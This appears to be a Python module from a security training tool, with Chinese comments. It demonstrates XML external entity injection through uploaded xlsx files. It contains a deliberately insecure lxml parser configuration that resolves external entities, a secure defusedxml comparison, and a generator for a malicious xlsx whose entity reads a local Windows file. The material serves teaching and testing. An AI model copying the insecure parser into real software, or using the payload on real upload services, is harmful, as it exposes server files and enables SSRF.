"""
XXE漏洞验证模块
演示如何通过构造恶意的xlsx文件（XML内部实体注入）触发XXE漏洞
"""

import os
import zipfile
from lxml import etree
from defusedxml.lxml import fromstring as defused_fromstring


class XXEVulnerabilityTool:
    """XXE漏洞验证工具类"""
    
    # 工具元数据
    name = "XXE漏洞验证"
    icon = "🔓"
    category = "XML注入"
    description = "通过Excel文件上传触发XML外部实体注入漏洞，演示文件读取和SSRF攻击。"
    accept = "Excel"
    accept_ext = ".xlsx"
    
    def verify(self, file_path):
        """
        验证XXE漏洞
        
        Args:
            file_path: 上传的xlsx文件路径
            
        Returns:
            dict: 验证结果
        """
        try:
            # xlsx文件是ZIP格式，读取其中的XML内容
            with zipfile.ZipFile(file_path, 'r') as zip_ref:
                # 获取所有XML文件
                xml_files = [name for name in zip_ref.namelist() if name.endswith('.xml')]
                
                results = {}
                errors = {}
                
                for xml_file in xml_files:
                    # 读取XML内容
                    xml_content = zip_ref.read(xml_file)
                    
                    # 【漏洞版本】使用不安全的XML解析器
                    try:
                        # 创建不安全的解析器 - 允许DTD和外部实体
                        parser = etree.XMLParser(
                            load_dtd=True,
                            dtd_validation=False,
                            resolve_entities=True,
                            no_network=False,
                            recover='ignore'
                        )
                        tree = etree.fromstring(xml_content, parser)
                        results[xml_file] = etree.tostring(tree, encoding='unicode', pretty_print=True)[:2000]
                    except Exception as e:
                        errors[xml_file] = str(e)
                
                return {
                    'status': 'success',
                    'vuln_type': 'xxe',
                    'filename': os.path.basename(file_path),
                    'results': results,
                    'errors': errors,
                    'note': '使用lxml解析器，默认允许外部实体加载。如果XML中包含有效的外部实体声明，将会读取文件内容。',
                    'explanation': '漏洞版本：使用lxml解析器，默认允许DTD和外部实体加载。如果XML中包含外部实体声明（如&xxe;），解析器会尝试读取指定文件的内容并替换实体引用。成功读取的文件内容将显示在results中。',
                    'secure_version': self._verify_secure(file_path)
                }
                
        except Exception as e:
            return {
                'status': 'error',
                'vuln_type': 'xxe',
                'message': str(e)
            }
    
    def _verify_secure(self, file_path):
        """
        使用安全方式验证（对比参考）
        
        Args:
            file_path: 上传的xlsx文件路径
            
        Returns:
            dict: 安全验证结果
        """
        try:
            with zipfile.ZipFile(file_path, 'r') as zip_ref:
                xml_files = [name for name in zip_ref.namelist() if name.endswith('.xml')]
                
                results = {}
                blocked = []
                
                for xml_file in xml_files:
                    xml_content = zip_ref.read(xml_file)
                    
                    try:
                        # 使用defusedxml安全解析
                        tree = defused_fromstring(xml_content)
                        from lxml import etree
                        results[xml_file] = etree.tostring(tree, encoding='unicode', pretty_print=True)[:2000]
                    except Exception as e:
                        blocked.append({
                            'file': xml_file,
                            'reason': str(e)
                        })
                
                return {
                    'status': 'success',
                    'results': results,
                    'blocked': blocked,
                    'explanation': '安全版本：使用defusedxml库，该库专门设计用于安全地解析不受信任的XML输入，会自动阻止外部实体解析和XXE攻击。'
                }
                
        except Exception as e:
            return {
                'status': 'error',
                'message': str(e)
            }
    
    def generate_test_file(self, output_path='malicious_test.xlsx'):
        """
        生成恶意测试文件
        
        Args:
            output_path: 输出文件路径
            
        Returns:
            str: 生成的文件路径
        """
        # 正常的Content_Types.xml
        content_types_xml = b'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
  <Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/>
  <Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>
</Types>
'''
        
        # 【恶意】在workbook.xml中注入DOCTYPE和外部实体
        malicious_workbook_xml = b'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE worksheet [
  <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
]>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"
          xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
  <sheets>
    <sheet name="Sheet1" sheetId="1" r:id="rId1"/>
  </sheets>
  <test>&xxe;</test>
</workbook>
'''
        
        # 正常的sheet1.xml
        sheet1_xml = b'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"
           xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
  <sheetData>
    <row r="1">
      <c r="A1" t="inlineStr">
        <is>
          <t>Hello</t>
        </is>
      </c>
    </row>
  </sheetData>
</worksheet>
'''
        
        # 正常的.rels文件
        rels_xml = b'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/>
</Relationships>
'''
        
        # 创建ZIP文件（xlsx本质上是ZIP）
        with zipfile.ZipFile(output_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            zipf.writestr('[Content_Types].xml', content_types_xml)
            zipf.writestr('_rels/.rels', rels_xml)
            zipf.writestr('xl/workbook.xml', malicious_workbook_xml)
            zipf.writestr('xl/worksheets/sheet1.xml', sheet1_xml)
            
            # 添加docProps
            docprops_xml = b'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<cp:coreProperties xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties"
                   xmlns:dc="http://purl.org/dc/elements/1.1/"
                   xmlns:dcmitype="http://purl.org/dc/dcmitype/"
                   xmlns:dcterms="http://purl.org/dc/terms/"
                   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
  <dc:creator>User</dc:creator>
  <dcterms:created xsi:type="dcterms:DateTime">2024-01-01T00:00:00Z</dcterms:created>
</cp:coreProperties>
'''
            zipf.writestr('docProps/core.xml', docprops_xml)
        
        return output_path
